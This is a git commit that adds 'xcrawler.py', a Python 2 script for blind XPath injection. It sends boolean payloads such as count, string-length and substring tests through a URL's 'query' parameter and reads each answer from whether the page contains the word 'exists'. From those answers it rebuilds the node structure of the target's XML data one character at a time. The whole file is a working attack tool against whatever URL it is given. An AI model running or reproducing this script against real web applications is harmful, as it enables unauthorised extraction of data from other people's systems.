96b63d934df9b4f74e42177c63ce6f4f4304e27d
hentouane <hentouane>
2017-12-13 17:11:36 -0500

    add first ugly seq version

---
+++ xcrawler.py
@@ -0,0 +1,88 @@
+#!/usr/bin/env python
+import argparse
+import string
+import sys
+import urllib
+import urllib2
+from xml.dom.minidom import *
+
+class XCrawler(object):
+    strTrue = " and '1'='1"
+    strFalse = " and '1'='0"
+    strCount = "' and count({})={}"
+    strLength = "' and string-length(name({}))={}"
+    strSub = "' and substring(name({}),1,{}) = '{}'"
+    strConfirm = "' exists"
+    charList = string.printable
+
+    def __init__(self):
+        args = self.setArgs()
+        self.url = args.url
+        self.searchPath = "/*[1]/*"
+        self.xml = Document()
+
+    def count_node(self, path):
+        count = 0
+        for i in range(1, 100):
+            payload = self.makePayload(self.strCount.format(path, i))
+            if self.getRequest(payload):
+                count = i
+                break
+        return count
+
+    def find_length(self, path):
+        length = 0
+        for i in range(1, 100):
+            payload = self.makePayload(self.strLength.format(path, i))
+            if self.getRequest(payload):
+                length = i
+                break
+        return length
+
+    def find_name(self, path, length):
+        name = ""
+        for i in range(1, length + 1):
+            for char in self.charList:
+                payload = self.makePayload(self.strSub.format(path, i, name + char))
+                if self.getRequest(payload):
+                    name += char
+                    break
+        return name
+
+    def getRequest(self, payload):
+        response = urllib2.urlopen(self.url + "?" + payload)
+        html = response.read()
+        return self.strConfirm in html
+
+    def makePayload(self, step):
+        return urllib.urlencode({"query": "hentouane" + step + self.strTrue})
+
+    def setArgs(self):
+        parser = argparse.ArgumentParser()
+        parser.add_argument('-url')
+        return parser.parse_args()
+
+    def crawlXml(self, base_path, parent_node = None):
+        nodeIndex = 1
+        path = base_path
+        nodeCount = self.count_node(path)
+        while nodeIndex <= nodeCount:
+            path = base_path + "[{}]".format(nodeIndex)
+            length = self.find_length(path)
+            name = self.find_name(path, length)
+            node = self.xml.createElement(name)
+            if parent_node is None:
+                self.xml.appendChild(node)
+            else:
+                parent_node.appendChild(node)
+            if self.count_node(path + "/*") > 0:
+                self.crawlXml(path + "/*", node)
+            nodeIndex += 1
+
+    def main(self):
+        self.crawlXml('/*')
+        print self.xml.toprettyxml()
+
+if __name__ == '__main__':
+    xcrawler = XCrawler()
+    xcrawler.main()
